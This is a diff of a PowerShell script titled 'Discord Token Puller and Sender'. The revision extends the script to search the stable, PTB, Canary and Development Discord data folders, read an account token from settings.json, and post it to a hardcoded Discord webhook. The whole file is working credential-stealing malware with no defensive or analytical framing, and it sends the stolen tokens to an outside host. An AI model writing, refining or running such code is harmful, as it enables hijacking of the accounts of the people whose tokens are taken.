@@ -1,13 +1,24 @@
-# Define the path to the Discord application data
-$discordPath = "$env:LOCALAPPDATA\Discord"
+# Discord Token Puller and Sender
 
 # Define the webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1538613009755144355/6SeHOPzVrWJ8R8TpyVeCVuAOlk0v0UfCFXPxhFBH9IQ30nTlS3rWIqaRdxufQJlAfu6R"
 
-# Check if the Discord directory exists
-if (Test-Path -Path $discordPath) {
+# Define the paths to the Discord application data for different versions
+$discordPaths = @(
+    "$env:LOCALAPPDATA\Discord",
+    "$env:LOCALAPPDATA\DiscordPTB",
+    "$env:LOCALAPPDATA\DiscordCanary",
+    "$env:LOCALAPPDATA\DiscordDevelopment"
+)
+
+# Function to extract the token
+function Extract-Token {
+    param (
+        [string]$path
+    )
+
     # Define the path to the Discord settings file
-    $settingsPath = "$discordPath\settings.json"
+    $settingsPath = "$path\settings.json"
 
     # Check if the settings file exists
     if (Test-Path -Path $settingsPath) {
@@ -17,19 +28,28 @@ if (Test-Path -Path $discordPath) {
         # Extract the token
         $token = $settings.token
 
-        # Create the message payload
-        $payload = @{
-            content = "Discord Token: $token"
-        }
-
-        # Send the message to the webhook
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
-
-        # Output the token
-        Write-Output "Discord Token: $token"
-    } else {
-        Write-Output "Settings file not found at $settingsPath"
+        return $token
     }
-} else {
-    Write-Output "Discord directory not found at $discordPath"
+
+    return $null
+}
+
+# Try to extract the token from each Discord path
+foreach ($discordPath in $discordPaths) {
+    if (Test-Path -Path $discordPath) {
+        $token = Extract-Token -path $discordPath
+        if ($token) {
+            # Create the message payload
+            $payload = @{
+                content = "Discord Token: $token"
+            }
+
+            # Send the message to the webhook
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
+
+            # Output the token
+            Write-Output "Discord Token: $token"
+            return
+        }
+    }
 }
